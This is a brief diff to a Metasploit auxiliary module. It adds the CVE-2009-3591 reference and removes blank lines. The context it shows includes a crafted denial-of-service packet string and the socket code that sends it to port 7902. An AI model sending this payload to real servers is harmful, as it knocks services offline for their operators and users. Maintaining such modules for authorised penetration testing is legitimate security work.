@@ -22,7 +22,7 @@ class Metasploit3 < Msf::Auxiliary
 				[
 					[ 'URL', 'None' ],
 					[ 'BID', 'None' ],
-					[ 'CVE', 'None' ],
+					[ 'CVE', 'CVE-2009-3591' ],
 				]))
 			
 			register_options([Opt::RPORT(7902),], self.class)
@@ -39,11 +39,8 @@ class Metasploit3 < Msf::Auxiliary
         # 525           dopelog(4, LF_SERVER, "%s jets to %s",
 
 		pkt =  "foo^^Ar1111111\n^^Acfoo\n^AV65536\n"
-	
 		print_status("Sending dos packet...")
-		
 		sock.put(pkt)
-		
 		disconnect
 
         print_status("Checking for success...")
